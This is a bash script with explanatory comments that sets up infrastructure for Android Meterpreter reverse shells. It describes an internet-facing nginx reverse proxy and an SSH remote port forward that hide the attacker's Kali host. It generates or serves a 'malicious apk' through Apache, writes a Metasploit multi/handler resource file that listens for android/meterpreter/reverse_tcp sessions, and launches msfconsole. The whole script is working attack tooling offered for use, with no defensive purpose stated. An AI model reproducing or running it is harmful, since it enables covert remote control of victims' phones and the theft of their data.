#!/bin/bash

# author: MaMe82
#
# Internet HTTPS setup for android reverse_https meterpreter
#
# 1) Payload connects back to server reachable from Internet via https (reverse_https to https://cyberawareness.de)
# 2) Server receives connection and proxy_forwards to https://127.0.0.1:4444 
#	- the proxy is running nginx (proxy_pass https://127.0.0.1:4444 for https:/cyberawareness.de:443)
#	- the proxy terminates HTTPS connection with a valid certificate for cyberawareness.de
#	- the webpage visible at https://cyberawareness.de is provided by the meterpreter payload handler
# 	- proxy_pass relays the connection to https://127.0.0.1:4444
# 3) The host running metasploit build a remote portforward to same webrproxy to redirect the the traffic to itself
# and receives the meterpreter session
#	- as stated under 2) the proxy receives the meterpreter connection on 127.0.0.1:4444 
# 	- this port is redirected to the Kali box via SSH remote port forward from PROXY_127.0.0.1:4444 to KALI_127.0.0.1:8888
#	(ssh -R 127.0.0.1:4444:127.0.0.1:8888 user@proxy)
# 4) In order to receive the payload connection from the reverse_https payload, a handler is created on the KALI box
#	- the handler uses the self signed default certificate, as the external HTTPS certificate chain already
#	get's terminated on the internet reachable reverse proxy, hosting the domain
#	- choosing this approach, it is possible to redirect multiple connections from to the same public IP to different
#	payloads by changing he used domain name (reverse proxying on virtual host basis). It is even possible to redirect
#	to a "normal" webserver based on clients UserAgent, Referer etc.
#
# Way of communication 
# 	android device (meterpreter/reverse_https) --> [ https://nginx.server:443 --> proxy_pass http://127.0.0.1:4444] <-- [ssh remote port 
#	forward	from kali_127.0.0.1:8888 to proxy_127.0.0.1:4444] --> msf handler (meterpreter/reverse_http)
#
# Important to make this work:
#	1) The OverrideRequestHost options of the handler have to be set accordingly to make the stager work
#	2) For some reason LHOST needs to be set to the internet outbound IP of the payload handler (0.0.0.0 or 127.0.0.1
# 		don't work for some reason, althoug traffic is redirected to 127.0.0.1:8888 via ssh)
#	--> This could be due to the stager making a direct connect to 10.0.0.1 (same LAN as victim device) and should be tested
#	via 3G connection from device

service postgresql start 

#generate malicious apk
#msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=5678 > app.apk


# provide malicious apk with apache
#cp app.apk /var/www/cp_temp
cp patched.apk /var/www/cp_temp/app.apk
chown www-data:www-data /var/www/cp_temp/app.apk

#create msf handler script
cat << EOF > handler.rc
use exploit/multi/handler
set verbose true
set payload android/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 5678
set MeterpreterServerName "nginx"
set HttpUnknownRequestResponse "<html><body>Nothing here</body></html>"
# not needed, cert is provided by online reverse proxy
#set HandlerSSLCert /root/droidattack/cert/unified.pem
set ExitOnSession false
exploit -j
clear
EOF


# start msf
msfconsole -r handler.rc
